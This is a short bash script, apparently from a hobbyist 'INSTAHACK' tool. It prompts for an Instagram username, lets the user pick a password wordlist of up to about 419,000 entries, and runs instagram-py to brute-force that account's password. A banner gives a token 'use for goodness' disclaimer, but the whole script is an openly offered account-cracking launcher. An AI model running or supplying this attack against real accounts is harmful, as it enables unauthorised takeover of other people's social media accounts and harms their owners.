#wordlist selection.
grn='\033[1;32m'
red='\033[1;31m'
rset='\033[0m'
ylo='\033[1;33m'
#!/bin/bash
#coding section starts :)
clear
echo
echo '
          ░█████╗░██╗░░░██╗████████╗░█████╗░
          ██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗
          ███████║██║░░░██║░░░██║░░░██║░░██║
          ██╔══██║██║░░░██║░░░██║░░░██║░░██║
          ██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝
          ╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░

  ░█████╗░████████╗████████╗░█████╗░░█████╗░██╗░░██╗
  ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║░██╔╝
  ███████║░░░██║░░░░░░██║░░░███████║██║░░╚═╝█████═╝░
  ██╔══██║░░░██║░░░░░░██║░░░██╔══██║██║░░██╗██╔═██╗░
  ██║░░██║░░░██║░░░░░░██║░░░██║░░██║╚█████╔╝██║░╚██╗
  ╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
               [INSTAGRAM BRUTE FORCE HACK]
               [AUTHER : Anonymous h4cker7]
               [YOU TUBE : Hacker_terminal]
               [INSTAGRAM: hacker_terminal]
                 [TOOL NAME : INSTAHACK]
 
_____________________[INSTAHACK 2020]___________________

PLEASE USE THIS SCRIPT FOR GOODNESS, NOT FOR BAD CRIMES,
          OTHERWISE YOU MAY RUN INTO PROBLEMS!
              [#] Auto Password Attack [#]
' |lolcat
printf "\n"
printf "      \e[101m\e[1;77m  >>  This script is inspired by ighack  << \e[0m\n"
printf "\n"
printf " \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m youtube.com/Hacker_terminal \e[100m\e[1;77m << \e[0m\n"
printf "\n"
echo
read -p "[#] User Name : " usrnm
echo
echo -e "$grn              [1]$red 1k Passwords$grn
              [2]$red 10K Passwords$grn
              [3]$red 4,19,070 Passwords $rset"
echo
read -p "[#] Enter Selected Number: " marks
echo 
if [ $marks = 1 ]
then
    instagram-py --username $usrnm --password-list $HOME/instahack/pass/pass1.txt 
 
elif [ $marks = 2 ]
then
    instagram-py --username $usrnm --password-list $HOME/instahack/pass/pass2.txt
 
elif [ $marks = 3 ]
then
    instagram-py --username $usrnm --password-list $HOME/instahack/pass/pass3.txt
else
echo
echo -e  "$ylo >>> exiting........! Bye Bye :) <<<$rset"
echo
sleep 1.0
cd $HOME
fi
sleep 5.0
cd $HOME/instahack
bash instahack.sh
